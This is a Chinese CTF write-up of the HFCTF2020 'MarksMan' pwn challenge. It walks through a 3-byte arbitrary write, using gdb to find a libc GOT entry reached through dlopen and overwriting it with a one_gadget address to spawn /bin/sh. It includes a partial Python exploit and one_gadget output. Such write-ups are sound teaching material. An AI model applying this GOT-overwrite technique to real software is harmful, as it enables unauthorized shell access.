## MarksMan (145pt)

- 题目描述：
  
    > The marksman can shoot very accurately!
    >
    > nc 39.97.210.182 10055
- 题目附件：[chall](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/icq-HFCTF2020/pwn/chall/chall)
- 考察点：任意写(3字节)
- 难度：一般

### 程序分析

很常规的一道内存任意写的题目，程序开头给了`puts`的地址，甚至都不需要泄漏libc。主要代码如下：

```c
  ptr = get_l();
  for ( i = 0; i <= 2; ++i ){
    puts("biang!");
    read(0, &src[i], 1uLL);
    getchar();
  }
  if ( goldfinger(src) ){
    for ( j = 0; j <= 2; ++j )
      *(j + ptr) = src[j];
  }
  if ( !dlopen(0LL, 1) )
    exit(1);
  puts("bye~");
  return 0LL;
```

先读一个指针，然后依次读三个字节，这三个字节的数据将会覆盖到指针执向内存的后三个字节。

### 解题思路

既然给了libc，那就找libc中的函数指针就行啦。

gdb跟进`dlopen`，发现`_dlerror_run+96`这里有个plt函数的调用：

```c
 ► 0x7ffff7bd2730 <_dlerror_run+96>     call   _dl_catch_error@plt <0x7ffff7bd1d90>
        rdi: 0x7ffff7dd40f0 (last_result+16) ◂— 0x0
        rsi: 0x7ffff7dd40f8 (last_result+24) ◂— 0x0
        rdx: 0x7ffff7dd40e8 (last_result+8) ◂— 0x0
        rcx: 0x7ffff7bd1f40 (dlopen_doit) ◂— push   rbx
```

跟进查看`_dl_catch_error`的plt表:

```c
► 0x7ffff7bd1d90 <_dl_catch_error@plt>             jmp    qword ptr [rip + 0x2022a2] <0x7ffff7dd4038>
   0x7ffff7bd1d96 <_dl_catch_error@plt+6>           push   4
   0x7ffff7bd1d9b <_dl_catch_error@plt+11>          jmp    0x7ffff7bd1d40
```

查看GOT表中的值：

```c
pwndbg> x/xg 0x7ffff7dd4038
0x7ffff7dd4038:	0x00007ffff7bd1d96
```

显然是个libc的函数，但是不知道是啥，不过那并不重要..只要是libc的就好，用任意写3字节直接覆盖后3字节，把他改成`one_gadget`就行了。

![](http://image.taqini.space/img/20200419193210.png)

### exp

对应exp如下：

```python
libc_got = 0x5f4038
og_off  = 0xe569f  # r12==NULL | r14==NULL

got = libcbase+libc_got
info_addr('got',got)
og = libcbase+og_off
info_addr('og',og)
ru('shoot!shoot!\n')
sl(str(got))
ru('biang!\n')
sl(p8(og&0xff))
ru('biang!\n')
sl(p8((og>>8)&0xff))
ru('biang!\n')
debug('b *$rebase(0xd63)')
sl(p8((og>>16)&0xff))
```

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/icq-HFCTF2020/pwn/chall) 

### More

对了，代码里有个什么金手指函数：

```c
  if ( goldfinger(src) ){
    for ( j = 0; j <= 2; ++j )
      *(j + ptr) = src[j];
  }

signed __int64 __fastcall goldfinger(_BYTE *a1)
{
  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) && (*a1 != 0x22 || a1[1] != 0xF3u) && *a1 != 0x8Cu && a1[1] != 0xA3u )
    return 1LL;
  puts("You always want a Gold Finger!");
  return 0LL;
}
```

调试的时候一直都是返回1，我就没搭理他，想着应该是没啥用的函数。

后来找`one_gadget`的时候发现原来是禁用了几个gadget，然鹅那么多gadget禁用了几个算啥，我用其他的就好了...出题人憨憨...

```bash
% one_gadget ./libc.so.6 -l2
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

```

> `one_gadget`默认显示的限制比较少的gadget，用`-l`参数可以设置显示的级别显示更多的gadget

这道题直接用 `r14 == NULL || r12 == NULL`这个就行。